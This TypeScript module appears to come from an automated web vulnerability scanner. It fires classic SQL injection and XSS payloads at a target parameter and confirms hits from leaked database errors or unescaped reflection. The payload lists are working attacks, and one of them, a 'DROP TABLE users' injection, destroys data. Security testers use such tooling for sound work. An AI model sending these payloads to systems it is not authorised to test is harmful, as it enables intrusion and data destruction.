/**
 * classicInjection — SQLi / XSS fallback primitives.
 *
 * Reuses existing payload knowledge to fuzz a parameter/endpoint with classic
 * SQL injection and XSS payloads. The oracle reuses observation oracles:
 *   - parseResponse → extract error text snippets / reflected content
 *   - checkWaf      → detect if a WAF blocked the attempt
 *   - findEndpointsInResponse → surface new endpoints leaked by errors
 * Confirmed ONLY when the response evidence (DB error / unescaped reflection)
 * is present AND verified by the EvidenceGate.
 */

import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'
import { observeParse, observeWaf, observeEndpoints } from './observers'

const SQLI_PAYLOADS = [
  "'",
  "' OR '1'='1",
  "1' ORDER BY 10-- -",
  "') OR ('1'='1",
  "1; DROP TABLE users-- -",
  "1 AND 1=CONVERT(int,@@version)-- -",
]
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  '${alert(1)}',
  '<svg/onload=alert(1)>',
]
const SQLI_ERROR_MARKERS = [
  'sql syntax', 'mysql', 'postgresql', 'sqlite', 'sqlstate', 'ora-', 'odbc',
  'syntax error', 'unclosed quotation', 'quoted string', 'you have an error',
  'pg_query', 'unknown column', 'ambiguous column', 'supplied argument',
]

function urlWithParam(url: string, param: string, value: string): string {
  try {
    const u = new URL(url)
    u.searchParams.set(param, value)
    return u.toString()
  } catch {
    return url
  }
}

export const classicInjection: TechniquePrimitive = {
  id: 'classicInjection',
  name: 'Classic Injection (SQLi/XSS)',
  description: 'Fuzz a parameter/endpoint with classic SQL injection and XSS payloads; confirm via DB error leakage or unescaped reflection.',
  technique: 'injection',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    return !!(ctx.param || (ctx.endpoint?.params && ctx.endpoint.params.length > 0))
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const url = ctx.endpoint?.url ?? ctx.target!
    const method = ctx.endpoint?.method ?? 'GET'
    const headers = { ...(ctx.sessionHeaders ?? {}) }
    const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'q'

    const steps: AttackStep[] = []
    SQLI_PAYLOADS.forEach((p, i) => {
      const stepUrl = urlWithParam(url, param, p)
      const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
      steps.push({
        id: `sqli-${i}`,
        description: `SQLi payload into ${param}`,
        request: { method, url: stepUrl, headers, ...(body ? { body } : {}) },
        expectedSignal: 'database error message leaked in response',
        metadata: { kind: 'sqli', param, payload: p },
      })
    })
    XSS_PAYLOADS.forEach((p, i) => {
      const stepUrl = urlWithParam(url, param, p)
      const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
      steps.push({
        id: `xss-${i}`,
        description: `XSS payload into ${param}`,
        request: { method, url: stepUrl, headers, ...(body ? { body } : {}) },
        expectedSignal: 'payload reflected unescaped in response',
        metadata: { kind: 'xss', param, payload: p },
      })
    })
    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const evidence: PrimitiveResult['evidence'] = []
    let sqliHit = false
    let xssHit = false
    let wafDetected = false
    const notes: string[] = []

    for (const r of results) {
      const kind = r.step.metadata?.kind
      const body = r.body ?? ''
      const lower = body.toLowerCase()

      const waf = await observeWaf(r.headers ?? {}, body)
      if (waf.detected) wafDetected = true

      if (kind === 'sqli') {
        const parsed = await observeParse(body, r.headers ?? {}, r.status ?? 0)
        const leaked = SQLI_ERROR_MARKERS.some(m => lower.includes(m)) ||
          parsed.textSnippets.some(s => SQLI_ERROR_MARKERS.some(m => s.toLowerCase().includes(m)))
        if (leaked && (r.status ?? 500) < 500) {
          sqliHit = true
          evidence.push({ kind: 'response', label: `SQLi error leaked [${r.step.metadata?.param}] ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: body.slice(0, 1500) })
        }
      } else if (kind === 'xss') {
        const payload = String(r.step.metadata?.payload ?? '')
        const reflected = lower.includes(payload.toLowerCase())
        const escaped = body.includes(payload.replace(/</g, '&lt;'))
        const unescaped = reflected && !escaped
        if (unescaped) {
          xssHit = true
          evidence.push({ kind: 'response', label: `XSS reflected unescaped [${r.step.metadata?.param}] ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: body.slice(0, 1500) })
        }
      }

      // Surface endpoints leaked by verbose errors.
      const endpoints = await observeEndpoints(body, r.step.request.url)
      if (endpoints.length > 0) {
        notes.push(`leaked endpoints: ${endpoints.slice(0, 3).join(', ')}`)
      }
    }

    const category = sqliHit ? 'sql_injection' : xssHit ? 'xss' : undefined
    const { verified } = evidenceGate.verifyClaim(`${category ?? 'injection'} on ${results[0]?.step.request.url ?? ''}`)
    const observed = sqliHit || xssHit
    const confirmed = observed && verified

    return {
      confirmed,
      confidence: confirmed ? 0.8 : observed ? 0.4 : 0.05,
      evidence,
      severity: confirmed ? 'high' : undefined,
      finding: confirmed
        ? {
            category,
            description: `${category === 'sql_injection' ? 'SQL injection' : 'XSS'} confirmed on ${results[0]?.step.request.url ?? ''} (param ${results[0]?.step.metadata?.param}).`,
            request: results[0]?.step.request,
            response: { status: results[0]?.status ?? 0, body: (evidence[0]?.data ?? '').slice(0, 1000) },
            cwe: category === 'sql_injection' ? 'CWE-89' : 'CWE-79',
          }
        : undefined,
      note: `sqliHit=${sqliHit} xssHit=${xssHit} waf=${wafDetected} verified=${verified}${notes.length ? '; ' + notes.join('; ') : ''}`,
    }
  },
}
